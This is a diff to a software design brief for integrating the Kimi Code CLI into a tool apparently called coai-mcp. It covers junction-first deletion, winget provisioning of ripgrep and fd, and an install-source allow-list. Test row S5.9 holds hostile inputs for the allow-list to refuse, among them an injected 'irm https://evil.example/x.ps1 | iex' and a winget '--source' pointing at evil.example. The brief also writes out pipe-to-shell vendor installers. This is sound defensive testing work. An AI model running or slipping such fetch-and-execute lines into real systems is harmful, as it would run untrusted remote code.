@@ -154,13 +154,21 @@ and the code disagree".**
    existing `catch (IOException)` carries the sentence to its log. The one deleter has the belt, so no caller can forget
    it — a separate `DisposeJunctionFirst` would have been every future caller's duty (S5's question row and consultant
    check among them). A sweep that meets the same tree later finds the link already gone and proceeds. Deviation 10.
+   *Plan round on #817 (accepted, 2026-10-14): belt AND braces — where a caller KNOWS it holds a Kimi home, D19's
+   original order is ALSO done explicitly by E4.2's `KimiHome.Dispose` (the junction first by its own name, the
+   target's names and count verified, only then `GitScratch`); this in-deleter check stays as the second belt, and the
+   only one for callers that do not know what they delete (the six-hour sweep, the snapshots, `TempDir`). E4.2 brief
+   §14, scenarios S2.36–S2.40.*
 3. **A `credentials` that is a REAL folder is the tree's own and goes with it** (S3's case `:100-113` stays the rule):
    there is no link to verify, the deleter never leaves coai's tree, and a copied secret inside coai's tree is better
    deleted than kept. A home whose junction was ALREADY removed is the same case. Neither is a stop.
-4. **Which callers stay on the bare deleter: all of them** — because after §2 the bare deleter IS the verified one.
-   Nothing new is called from `RoundScratch`, the sweep, the snapshot or the question row; what changes is that a loss
-   is LOUD where it was swallowed (brief §3). `PruneOldScratchDirs`, `ConsultantHomeSweep` and `RoundScratch` each get
-   the scenario that proves it (S1.7, S1.8, S1.12).
+4. **Which callers stay on the bare deleter: every one that does not know what it deletes** — the six-hour sweep, the
+   snapshots, the tests' `TempDir`, and `RoundScratch`'s delete of the whole scratch — because after §2 the bare deleter
+   IS a verified one. The callers that KNOW they hold a Kimi home — the round's scratch for its `kh-*` children (wired
+   by E4.4), D20's sweep and `close_consult` for `coai-kimi/<id>` (wired by E4.2), S5's question row and consultant check
+   — call E4.2's `KimiHome.Dispose` FIRST (the plan round's accepted finding), then the bare deleter. What THIS story
+   changes in every caller is only that a loss is LOUD where it was swallowed (brief §3). `PruneOldScratchDirs`,
+   `ConsultantHomeSweep` and `RoundScratch` each get the scenario that proves it (S1.7, S1.8, S1.12).
 5. **Windows only.** `Junctions.Make` on any other host answers the D18 sentence and makes nothing; the deleter's
    verification is host-neutral (a symlink's `LinkTarget` reads the same way) and runs everywhere.
 
@@ -363,11 +371,14 @@ validation before every launch; the built environment (`ProcessEnvironment.Minim
    elsewhere (deduplicated, `rg` then `fd`), then the parent's entries not already listed — so `PATH` still BEGINS with
    the person's `bin` (D19) and both tools resolve without a download. One or both missing → refused before any process:
    `ripgrep (rg) and fd were not found in {bin} or on PATH — Kimi's Grep and Glob would download them into the
-   coai-owned home, which coai refuses (D19); install them (winget install BurntSushi.ripgrep.MSVC sharkdp.fd) and restart
-   the editor, or run kimi once in a terminal and use its search, which downloads both into {bin}` — with the missing
-   name(s) in place of "rg and fd". Both tools, because Kimi documents downloading BOTH into `bin/` (§18) and a `bin/` of
-   either refuses the next launch (K18). M-K12 (c) stays the cell that lets the help claim "never receives code"; the
-   `bin/` refusal stays the net.
+   coai-owned home, which coai refuses (D19); install them — `winget install --id BurntSushi.ripgrep.MSVC -e` and
+   `winget install --id sharkdp.fd -e`, the two steps the panel's Install button for Kimi runs — and restart the editor;
+   or run kimi once in a terminal and use its search, which downloads both into {bin}` — with the missing name(s) in
+   place of "rg and fd". Both tools, because Kimi documents downloading BOTH into `bin/` (§18) and a `bin/` of either
+   refuses the next launch (S2.18). *Plan round on #817 (accepted, 2026-10-14): this refusal stays the NET; E4.5's
+   Install and Update buttons PROVISION both tools through the projects' own winget packages (E4.5 brief §6), so a fresh
+   install's first review never meets this sentence.* M-K12 (c) stays the cell that lets the help claim "never receives
+   code".
 3. **ONE string builder for both runtimes' version warning** — `VersionWarnings.Unmeasured(runtime, running, measured,
    numbersCover, advised)`; `VibeLaunch.Unmeasured` calls it with Vibe's four fragments and produces today's sentence BYTE
    FOR BYTE (the existing Vibe test proves it untouched); Kimi's reads `Kimi {running} is not a version coai has measured
@@ -573,10 +584,33 @@ validation before every launch; the built environment (`ProcessEnvironment.Minim
     scripts/probe-vibe-confinement.mjs` with this Vibe to measure it")` — byte-identical to today's output.
 13. **Docs**: `research/module_runners.md` — a *Kimi* unit beside the Vibe one (the places resolved once, the tools
     rule, the config render and its readers, the validation list, the environment, the two locks and their order, the
-    shared warning builder); `shared/kimi-model-blocks.json` documented where the Vibe manifest is (the csproj comment
-    and the module doc); `research/module_tests.md` rows for the classes below; the parent plan's §4 S4 block records
-    deviations 9–12 when the story lands (its text stays the plan's until then). E4.3 and E4.4 read the seam from
-    decision 4 (the bracketed notes in their sections).
+    shared warning builder, the junction-first disposal); `shared/kimi-model-blocks.json` documented where the Vibe
+    manifest is (the csproj comment and the module doc); `research/module_tests.md` rows for the classes below; the
+    parent plan's §4 S4 block records deviations 9–12 when the story lands (its text stays the plan's until then). E4.3
+    and E4.4 read the seam from decision 4 (the bracketed notes in their sections).
+14. **`KimiHome.Dispose` — D19's order, explicit, for every caller that knows it holds a Kimi home** (the plan round on
+    #817, accepted 2026-10-14: belt and braces over E4.1's in-deleter check). `public abstract record Disposal {
+    Clean(bool LinkWasThere); Stopped(string Reason) }` (closed). `static Disposal Dispose(string root, Action<string>
+    warn)`, in this order and no other: (1) `link = root/home/credentials`; when `OwnedPaths.IsLinkIfThere(link)`:
+    `target = Junctions.Target(link)` (read from the link's OWN reparse data, never by walking into it); `before` = the
+    target's direct entry names and their count (empty and unverified when the target cannot be listed);
+    `Directory.Delete(link, recursive: false)`; `IsLinkIfThere(link) || Directory.Exists(link)` after → `Stopped("{link}
+    still exists after its unlink — nothing was deleted")`; `after` read the same way; a name of `before` absent from
+    `after`, or a count below `before`'s → `Stopped("the folder {target} lost {names} during the unlink of {link} —
+    nothing more was deleted; check it before deleting {root} again")`; (2) when `link` is a REAL folder or absent:
+    nothing to unlink or verify (E4.1 decision 3); (3) only then `GitScratch.DeleteEvenIfReadOnly(root)` — whose own
+    check (E4.1 brief §2) is the second belt and meets no link at `credentials` any more; a `LinkTargetLostException`
+    from a link elsewhere in the tree → `Stopped(its message)`; any other `IOException` → `warn` and `Stopped`. A
+    `Stopped` deletes nothing more and is LOGGED by every caller. An `internal static Action<string>? AfterUnlink` seam
+    (test only) runs between (1)'s unlink and its second read. `static int DisposeAllUnder(string folder, Action<string>
+    warn)` — `Dispose` on the folder itself when `folder/home` exists (S5's conversation root), then on every direct
+    child whose name begins `KimiHome.Prefix` (`kh-`); answers how many were `Clean`; a `Stopped` is warned and the walk
+    goes on. **Callers:** D20's `ConsultantHomeSweep.Pass.Removed` — under its locks, before `DeleteAllBut` (`:175`),
+    `KimiHome.DisposeAllUnder(folder, warn)`, and a `Stopped` → `warn` and `return false` (the folder is kept this beat;
+    `close_consult`'s `RemoveNow` goes through the same `Removed`) — wired in THIS story with S2.39; the round's scratch —
+    `RoundScratch.Delete` calls `KimiHome.DisposeAllUnder(Directory, _note)` before its deleter — wired by E4.4 (its
+    bracketed note and S4.15), the primitive and its tests are this story's; the question row's `finally` and the
+    consultant check — S5's. `KimiRuntime`'s own probe home holds no junction and stays on the bare deleter.
 
 **SCENARIOS.** Every fake person's home is a folder INSIDE the test's own `TempDir.For("testsToDelete-kimi-…")`, holding
 `config.toml` (the owner's shape: the managed provider, its OAuth slot, a `moonshot-ai` row with an `api_key`, a
@@ -624,6 +658,11 @@ validation before every launch; the built environment (`ProcessEnvironment.Minim
 | S2.33 `MeasuredVersions_IsTwoOneOne` | — | `KimiAcpProfile.MeasuredVersions`; `KimiLaunch.VersionWarning("kimi 2.1.1")`, `("kimi 2.2.0")` | `["2.1.1"]`; empty; the sentence | — |
 | S2.34 `AfterALaunch_TheHomeGoes_AndThePersonsFolderIsWhole` | S2.26's root disposed through `GitScratch.DeleteEvenIfReadOnly(root)` | — | gone; the fake `credentials/` keeps both files, bytes and `ReadOnly` | (green after E4.1) |
 | S2.35 `NothingOfThePersons_IsEverWritten` | the fake person's home hashed (every file: bytes + attributes) | `Resolve` → `Made` → `Refusal` → `TakeAsync` → `Dispose` → the root deleted | the hash equal (M-K11 (b)'s rule on a fake home — the parent's §9) | — |
+| S2.36 `TheDisposal_RemovesTheJunctionFirst_VerifiesTheTarget_ThenTheRest` (`KimiHomeTests`) | S2.15's home plus `sessions/x` and `config.toml`; `GitScratch.AfterUnlink` set to a recorder | `KimiHome.Dispose(root)` | `Clean(LinkWasThere: true)`; the root gone; the fake `credentials/` keeps both files (bytes, `ReadOnly`, count 2); the recorder was NEVER invoked — the deleter met no link, so the junction went first | the recorder invoked (the bare deleter unlinks it) / a stub: `Stopped` |
+| S2.37 `AVerificationThatFails_StopsTheDisposal_WithTheSentence` | `KimiHome.AfterUnlink` deletes `credentials/kimi-code.json` in the target between the unlink and the second read | `Dispose` | `Stopped` naming `kimi-code.json` and the target; `home/config.toml` and `home/sessions/x` STILL EXIST; the link gone; nothing else deleted | `Clean`, the root gone |
+| S2.38 `AHomeWhoseJunctionIsGone_OrWhoseCredentialsIsReal_GoesWhole` (Theory) | the link removed beforehand; `credentials` a real folder holding a read-only copy | `Dispose` | `Clean(LinkWasThere: false)`; the root gone; the fake person's folder untouched | — |
+| S2.39 `TheSweepsKimiPath_DisposesJunctionFirst_AndKeepsTheFolderOnALoss` (`ConsultantHomeSweepTests`) | an orphaned `coai-kimi/<id>` past the window whose `home/credentials` is a junction to the test's `persons/`; `GitScratch.AfterUnlink` a recorder; a second arm with `KimiHome.AfterUnlink` deleting a target file | `ConsultantHomeSweep.Sweep` | the folder gone, the recorder never invoked, `persons/` intact; the loss arm: `warn` holds the `Stopped` sentence, the folder KEPT with its lock file, the next beat (seam off) removes it | the recorder invoked; the loss arm: the folder gone |
+| S2.40 `DisposeAllUnder_FindsTheFolderItselfAndEveryKhChild` | a folder holding `home/credentials` (a junction), `kh-aaaaaaaaaa/home/credentials` (a junction), `kh-bbbbbbbbbb/` (no link), `vh-cccccccccc/` and `tree/` | `DisposeAllUnder` | answers 3; both junctions gone first (the recorder never invoked), both targets intact; `vh-*` and `tree/` left for the caller's deleter | — |
 
 **Review focus (Opus).** (1) Nothing in `KimiLaunch`, `KimiHome`, `KimiPlaces.ForShim` reads `SpecialFolder.UserProfile`,
 `Environment.GetEnvironmentVariable` or `KimiAcpProfile.InstalledExecutable` — grep the diff; the only environment read
@@ -635,7 +674,9 @@ EVERY way out of `TakeAsync` after it was taken (a refusal, a throw, a cancellat
 with `ProcessEnvironment.NameComparer`. (6) The tools rule: both names; the sentence's two cures; no download path
 admitted. (7) Vibe's warning byte-identical — the existing test untouched and green. (8) CC ≤ 4 everywhere; `Refusal`'s
 walk will want to grow — keep it in `Judge`-sized methods. (9) No test touches `~/.kimi-code`; every junction target is
-inside the test's `testsToDelete-` folder.
+inside the test's `testsToDelete-` folder. (10) `KimiHome.Dispose`'s order is the code's order — the unlink before any
+read of the tree, the verification before `GitScratch`, a `Stopped` that leaves `config.toml` in place; the sweep's
+`Removed` returns false on a `Stopped` while its lock file is still held.
 
 **Docs.** As brief §13.
 
@@ -811,6 +852,10 @@ version without touching the person's home, and appears in the seeds. After this
    - **Register**: `ReviewerRuntimeSelector.Default` (`:835-836`), `RuntimeNames` (`:851-855`, `"kimi"`), `Named`
      (`"kimi" => new Kimi.KimiRuntime(vendorId)`), `MachineOnlyRuntimes` (`:870-871`, D12 — with a remarks sentence like
      the `vibe` one).
+   - *[Judge's edit, 2026-10-14, the plan round on #817:]* **the round's scratch disposes its Kimi homes junction-first**:
+     `RoundScratch.Delete` (`RoundScratch.cs:69-82`) calls `KimiHome.DisposeAllUnder(Directory, _note)` (E4.2 brief §14)
+     BEFORE `GitScratch.DeleteEvenIfReadOnly(Directory)`; a `Stopped` home is noted and the scratch's own delete still
+     runs on the rest (the in-deleter check, E4.1 brief §2, guards it). S4.15.
 2. **Classification from the report, never from text** (parent §4 S4, risk consultation `ba5f661a`). Add to
    `IReviewerRuntime` a default member `RateLimitVerdict RateLimited(ReviewerInvocation invocation, ProcessResult result)`
    whose default body is exactly today's (`RateLimit.Hit(result)` → limited with `RateLimit.Reason(result)` and
@@ -860,6 +905,7 @@ version without touching the person's home, and appears in the seeds. After this
 | S4.12 `KimiIsDiagnosedInItsOwnWords` | stderr `not_signed_in: … — run \`kimi login\` …`, `subscription_model: …`, `balance_spent: …`, `model_not_offered …`; `InstallCure("kimi", true/false)` | `VendorDiagnosis` | a sentence per name that keeps the cure; the two install lines exactly as in §E4.5 | null / codex's cure |
 | S4.13 `TheSeedsKnowKimi` | — | `FeatureAvailabilityTests`, the generator's `--check` | `kimi` in `runtimes`; `effort` and `thinking` `unmeasured`, `fastMode` `none`; generated TS current | missing rows |
 | S4.14 `EveryAdapterRecordsWhatItLaunched` (`EveryAdapterRecordsWhatItLaunchedTests.cs:73`) | the list gains `kimi` | — | the adapter's invocation names its model | the list lacks it |
+| S4.15 `TheRoundsScratch_DisposesItsKimiHomeJunctionFirst` (judge's edit, #817's plan round) | a `RoundScratch` whose directory holds `kh-0123456789/home/credentials` → a junction to the test's `persons/` (a read-only file) and a `vh-*` folder; `GitScratch.AfterUnlink` a recorder | `Dispose()` | the scratch gone; the recorder never invoked (the junction went first through `KimiHome.Dispose`); `persons/` intact; a loss arm (`KimiHome.AfterUnlink`) → `_note` holds the `Stopped` sentence | the recorder invoked |
 
 **Done when** every scenario is green through BOTH the executor and the scheduler where the table says so, the whole
 suite is green, and — the live check that unit tests cannot replace (parent §5) — one `providers` call on the owner's
@@ -936,19 +982,52 @@ macOS through Moonshot's official installer — and an older `coai-mcp` never re
   Kimi in their own home — where `kimi login` signs coai's launches in, through the junction); `USAGE_COMMAND.kimi =
   '/usage'` (RESULTS §5: Kimi's own command, answered without a model call); `DOCS.kimi =
   'https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started'`.
-6. **Install and update per OS** (D16; the owner's order: the buttons work on every OS). `kimiInstall(platform)`:
-   `win32` → `irm https://code.kimi.com/kimi-code/install.ps1 | iex`, prerequisite `winget install Git.Git` (Kimi's
-   documented Windows prerequisite), note: the folder (`%USERPROFILE%\.kimi-code\bin`), that the installer puts it on the
-   user PATH and VS Code must restart before ▶ finds it, then sign in — `kimi`, then `/login` — which only the person can
-   do; `linux`/`darwin` → `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`, note: it edits one shell rc
-   file, sign in the same way, and coai-mcp does not run Kimi on Linux, WSL or macOS yet (D18) — the button still
-   installs it there, as the owner ordered. `kimiUpdate` = `kimiInstall` (re-running the script installs the latest —
-   the scripts, read 2026-10-14); NOT `kimi upgrade`: it is documented but unmeasured here, and `fromOfficialSources`
-   refuses a step saying `upgrade` that no verb reads — changing the check for one unmeasured command is not worth it.
-   Register both in `OWN_INSTALLER` and `OWN_UPDATE`. Write the sources into the remarks as the Vibe block does.
-7. **`OFFICIAL_SOURCES`**: `urls` gains exactly `'https://code.kimi.com/kimi-code/'` (the domain AND path — not
-   `cdn.kimi.com`, which the command never names; the redirect is the publisher's). `packages` gains nothing (nothing is
-   npm-installed).
+6. **Install and update per OS** (D16; the owner's order: the buttons work on every OS). *[Judge's edit, 2026-10-14 —
+   the plan round on #817 accepted: the buttons PROVISION ripgrep and fd on the side they act on, so a fresh install's
+   first review never meets E4.2's tools refusal (its decision 2); the refusal stays the net.]* `kimiInstall(platform)`:
+   - `win32` → ONE PowerShell line of steps in the Vibe line's shape (`vibeInstall`, `vendorTerminal.ts:389-418`; each
+     step guarded, each failure STOPS the line — the `vibeWindowsInstallRuns.test.ts` (b) rule):
+     `if (-not (Get-Command git -ErrorAction SilentlyContinue)) { winget install --id Git.Git -e --accept-source-agreements --accept-package-agreements; if ($LASTEXITCODE -ne 0) { return } };`
+     then the same guarded step for `rg` with `--id BurntSushi.ripgrep.MSVC`, then for `fd` with `--id sharkdp.fd`, then
+     `irm https://code.kimi.com/kimi-code/install.ps1 | iex`. The guards (`Get-Command rg`/`fd`/`git`) make the line
+     idempotent — the Update button re-runs it and skips what is there — and keep winget's "already installed" exit
+     (non-zero) from stopping the line. **The two winget packages are the projects' own, verified 2026-10-14 by
+     `winget show --id <id> -e`:** `BurntSushi.ripgrep.MSVC` (15.2.0, Publisher `BurntSushi`, Publisher Url
+     `https://github.com/BurntSushi`, Moniker `rg`) and `sharkdp.fd` (10.5.0, Publisher `David Peter`, Homepage
+     `https://github.com/sharkdp/fd`); their `Installer Url` lines (same `winget show`, 2026-10-14) are the projects' own
+     GitHub release assets, `Installer Type: portable (zip)` —
+     `https://github.com/BurntSushi/ripgrep/releases/download/15.2.0/ripgrep-15.2.0-x86_64-pc-windows-msvc.zip` and
+     `https://github.com/sharkdp/fd/releases/download/v10.5.0/fd-v10.5.0-x86_64-pc-windows-msvc.zip` — nobody's
+     repackaging. The coder writes both into the remarks beside the sources, as the Vibe block cites Astral's; a later
+     version's manifest is checked the same way before the id list is trusted again. Note for the person:
+     the folder (`%USERPROFILE%\.kimi-code\bin`), that the installer puts it on the user PATH and VS Code must restart
+     before ▶ (and coai-mcp's `PATH`) finds `kimi`, `rg` and `fd`, then sign in — `kimi`, then `/login` — which only the
+     person can do.
+   - `linux`/`darwin` → `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`, note: it edits one shell rc
+     file, sign in the same way, and coai-mcp does not run Kimi on Linux, WSL or macOS yet (D18) — the button still
+     installs Kimi there, as the owner ordered, and does NOT yet provision the tools (D18 refuses the review that would
+     need them). **Written down for the day D18 lifts** (the projects' README installation sections,
+     `github.com/BurntSushi/ripgrep#installation`, `github.com/sharkdp/fd#installation`, read 2026-10-14): macOS `brew
+     install ripgrep fd`; Debian/Ubuntu `sudo apt-get install -y ripgrep fd-find` — where the binary is `fdfind`, and
+     Kimi looks for `fd`, so the line also makes `~/.local/bin/fd` a link to it (fd's README's own instruction); Fedora
+     `sudo dnf install ripgrep fd-find`; otherwise the projects' GitHub release archives. `OFFICIAL_SOURCES` would then
+     need `brew install` and `apt-get install` verbs with their package lists — a change of that day, not this story's.
+   `kimiUpdate` = `kimiInstall` (re-running the script installs the latest — the scripts, read 2026-10-14; the guarded
+   tool steps are skipped when present); NOT `kimi upgrade`: it is documented but unmeasured here, and
+   `fromOfficialSources` refuses a step saying `upgrade` that no verb reads — changing the check for one unmeasured
+   command is not worth it. Register both in `OWN_INSTALLER` and `OWN_UPDATE`. Write the sources into the remarks as the
+   Vibe block does.
+7. **`OFFICIAL_SOURCES`** (`officialSources.ts:17-28`, `VERBS` `:42-46`, `isOfficialPackage` `:118-122`): `urls` gains
+   exactly `'https://code.kimi.com/kimi-code/'` (the domain AND path — not `cdn.kimi.com`, which the command never names;
+   the redirect is the publisher's). `packages` gains nothing (nothing is npm-installed). *[Judge's edit, 2026-10-14:]*
+   today NO verb reads `winget install` (`unknownInstall` refuses any step holding `install`), so the Windows line of §6
+   — and the Git prerequisite the first draft already had — would be refused whole. Extend the SHAPE, not the rule: a
+   new list `wingetIds: ['Git.Git', 'BurntSushi.ripgrep.MSVC', 'sharkdp.fd']` beside `packages`, and a fourth `VERBS`
+   entry `{ words: ['winget', 'install'], flags: ['--id', '-e', '--exact', '--accept-source-agreements',
+   '--accept-package-agreements', '--silent', '-h'], spec: /^([A-Za-z0-9][A-Za-z0-9.+-]*)$/u, admitted: 'wingetIds' }`
+   — `isOfficialPackage` takes the verb's `admitted` list (`packages` for npm and uv, unchanged). What stays refused by
+   construction: `--source`, `-s`, `--manifest`, `--location`, `-v`/`--version`, a second id in one step, an id not in
+   the list — each a way to install something other than the three publishers' packages.
 8. **The update light**: `NPM_PACKAGE.kimi = '@moonshot-ai/kimi-code'` in `cliVersions.ts` — the version SOURCE only (the
    same release line as the script's binaries, see the sources above); `vendorTerminal.ts`'s `PACKAGE` stays without
    `kimi`, so the update command is the script, never npm. Correct D16's "neither is on npm" for Kimi in the remarks.
@@ -974,9 +1053,10 @@ macOS through Moonshot's official installer — and an older `coai-mcp` never re
 | S5.4 `thePresetRoundTrips` | the `Kimi Code` preset | added, saved, read back through `vendorsFrom` | id, runtime, model and flags intact; hint names `KIMI_RUNTIME_SINCE` | preset absent |
 | S5.5 `kimiHasItsOwnColour` | `kimi` with every anchored runtime configured | colour allocation | slot 11, never shared | hashed slot |
 | S5.6 `playOpensPlainKimi` | a `kimi` row with a model | `vendorTerminal` | command `kimi` (or the row's CLI path), no `acp`, no model flag, no `KIMI_CODE_HOME` in `env` | `codex -m …` (the unknown-runtime fallback, `vendorTerminal.ts:215`) |
-| S5.7 `installIsMoonshotsPerOs` | `kimi` on `win32`, `linux`, `darwin` | `vendorInstall` | exactly the two documented lines; Windows prerequisite `winget install Git.Git`; each `fromOfficialSources` true | the npm/codex fallback, or an unofficial line |
+| S5.7 `installIsMoonshotsPerOs` (judge's edit: the Windows line provisions the tools) | `kimi` on `win32`, `linux`, `darwin` | `vendorInstall` | `win32`: the one line of brief §6 — the three guarded `winget install --id <Git.Git / BurntSushi.ripgrep.MSVC / sharkdp.fd> -e …` steps, in that order, then Moonshot's `irm … \| iex`; `linux`/`darwin`: Moonshot's `curl … \| bash` alone; each `fromOfficialSources` true | the npm/codex fallback, or an unofficial line; the Windows line REFUSED by `fromOfficialSources` (no `winget` verb) |
 | S5.8 `updateIsTheInstallerAgain` | the same three platforms, an installed `2.1.1` | `vendorUpdate` | the install line again (never `kimi upgrade`, never npm); `fromOfficialSources` true | `npm install -g …` or codex's |
-| S5.9 `officialSourcesAdmitOnlyMoonshotsPath` | `irm https://code.kimi.com/kimi-code/install.ps1 \| iex` ; `…/kimi-code.evil.example/…` ; `https://code.kimi.com/other/x.ps1 \| iex` ; the install line `; irm https://evil.example/x.ps1 \| iex` | `fromOfficialSources` | true ; false ; false ; false | the first is false (prefix not admitted) |
+| S5.9 `officialSourcesAdmitOnlyMoonshotsPath_AndTheThreeWingetIds` (judge's edit) | `irm https://code.kimi.com/kimi-code/install.ps1 \| iex` ; `…/kimi-code.evil.example/…` ; `https://code.kimi.com/other/x.ps1 \| iex` ; the install line `; irm https://evil.example/x.ps1 \| iex` ; `winget install --id sharkdp.fd -e` ; `winget install --id BurntSushi.ripgrep.MSVC -e --accept-source-agreements` ; `winget install --id Evil.Tool -e` ; `winget install --id sharkdp.fd --source https://evil.example` ; `winget install --manifest C:\x.yaml` ; `winget install --id sharkdp.fd -v 1.0` ; `winget install --id sharkdp.fd --id Git.Git` ; `npm install -g @openai/codex` (unchanged) | `fromOfficialSources` | true ; false ; false ; false ; true ; true ; false ; false ; false ; false ; false ; true | the first is false (prefix not admitted); every `winget` row false (no verb reads it) |
+| S5.15 `theToolStepsSkipWhatIsThereAndStopOnFailure` (`kimiWindowsInstallRuns.test.ts`, Windows only, the Vibe harness: a temp folder with spaces on PATH, a `winget` FUNCTION standing in for the real one that logs its arguments and answers a scripted exit, `rg.exe`/`fd.exe`/`git.exe` stubs present or absent per arm) (judge's edit) | (a) all three present; (b) `rg` absent, the stand-in exits 0; (c) `fd` absent, the stand-in exits 1 | the Windows line RUN in Windows PowerShell 5.1 and pwsh 7 | (a) the stand-in never called, Moonshot's step reached; (b) called once with `install --id BurntSushi.ripgrep.MSVC -e …`, then Moonshot's step; (c) called once, the line STOPS — Moonshot's step not reached | — (no line) |
 | S5.10 `theWindowsLineParsesInPowerShell` (`kimiWindowsInstall.test.ts`) | the `win32` install command | PowerShell's own parser (the Vibe test's harness) | no parse error | — (no command) |
 | S5.11 `theUpdateLightReadsNpm` | `versionSourceFor('kimi', p, a)` | — | `{ kind: 'npm', package: '@moonshot-ai/kimi-code' }` | undefined |
 | S5.12 `anOlderServerNeverGetsAKimiRow` | installed server one minor below `KIMI_RUNTIME_SINCE`; an enabled `kimi` row and a `codex` row | the settings mirror (`vendorsWire`) | the `kimi` row withheld, the `codex` row sent, the card's note names `KIMI_RUNTIME_SINCE`; at `KIMI_RUNTIME_SINCE` the row crosses; an unknown server version → crosses | the `kimi` row crosses |
@@ -1016,17 +1096,24 @@ D18 still refuses a Kimi REVIEW there.
    released after an `await`; the file is `<LocalApplicationData>/coai-mcp/kimi-locks/<sha256(target)[..16]>.lock`,
    beside `EngineLease`'s folder — never under `coai-kimi/` (the D20 sweep walks it) and never in temp. Inside the row's
    timeout, as D19 states. To be recorded in the parent's D19 at promotion.
-10. **D19's disposal ORDER is not what the code does — its GUARANTEE is** (Fable, E4.1 decision 2): no coai deleter has
-    a step that follows a link, so "the junction first, then the rest" has nothing to order; the verification D19 asks
-    for (the target lost nothing, else stop) lives inside the one deleter's `Unlink` as `LinkTargetLostException`, and
-    every caller — the round's scratch, the six-hour sweep, D20's sweep, `close_consult`, the question row, the
-    consultant check, the snapshots, the tests' `TempDir` — gets it with no new call. D20's "junction-first for Kimi"
-    bullet reads the same way at promotion. The maker is the P/Invoke form, not `cmd.exe` (E4.1 decision 1).
-11. **Ripgrep and fd are FOUND before the launch, never guaranteed by `PATH` alone** (Fable, E4.2 decision 2): D19's
-    "where Kimi's installer puts `rg.exe`" is false (item 4); the launch is refused before any process when `rg` or `fd`
-    does not resolve in the person's `bin` or on the parent's `PATH`, with the two cures in the sentence; the built `PATH`
-    still begins with the person's `bin`, then the folder of each tool found elsewhere; the `bin/` refusal in the home
-    stays. Nothing is ever admitted into the home by hash.
+10. **D19's disposal order is done TWICE — explicitly where the home is known, and inside the one deleter everywhere**
+    (Fable, E4.1 decision 2; amended by the plan round on #817, accepted 2026-10-14). No coai deleter has a step that
+    follows a link, so the in-deleter verification (the target lost nothing, else `LinkTargetLostException` and stop)
+    reaches every caller — the six-hour sweep, the snapshots, the tests' `TempDir` — with no new call. On top of it,
+    exactly D19's order is done by E4.2's `KimiHome.Dispose` wherever the caller KNOWS it holds a Kimi home: the
+    junction first by its own name, the person's folder verified by names and count, only then `GitScratch` — called by
+    D20's sweep and `close_consult` (E4.2), the round's scratch (E4.4), the question row and the consultant check (S5).
+    D20's "junction-first for Kimi" bullet therefore stays TRUE as written; what the parent records at promotion is
+    the second belt. The maker is the P/Invoke form, not `cmd.exe` (E4.1 decision 1).
+11. **Ripgrep and fd are FOUND before the launch, never guaranteed by `PATH` alone — and PROVISIONED by the buttons**
+    (Fable, E4.2 decision 2; amended by the plan round on #817, accepted 2026-10-14): D19's "where Kimi's installer puts
+    `rg.exe`" is false (item 4); the launch is refused before any process when `rg` or `fd` does not resolve in the
+    person's `bin` or on the parent's `PATH`, with the two winget commands in the sentence; the built `PATH` still begins
+    with the person's `bin`, then the folder of each tool found elsewhere; the `bin/` refusal in the home stays. Nothing
+    is ever admitted into the home by hash. The owner's "the install buttons must work": E4.5's Windows Install/Update
+    line installs `BurntSushi.ripgrep.MSVC` and `sharkdp.fd` (the projects' own winget packages, verified 2026-10-14)
+    before Moonshot's installer, guarded and stopping on failure, and `OFFICIAL_SOURCES` admits exactly those ids (E4.5
+    brief §6–§7); Linux/macOS get the written-down lines when D18 lifts.
 12. **Two refusals D19 did not spell out** (Fable, E4.2 decision 6): the person's managed provider must be `type =
     "kimi"` and its slot `storage = "file"` (the measured bytes; a keyring slot has no folder to junction); a person's
     `[models."<id>"]` block that is on another provider, or that coai cannot read whole, refuses with a cure instead of
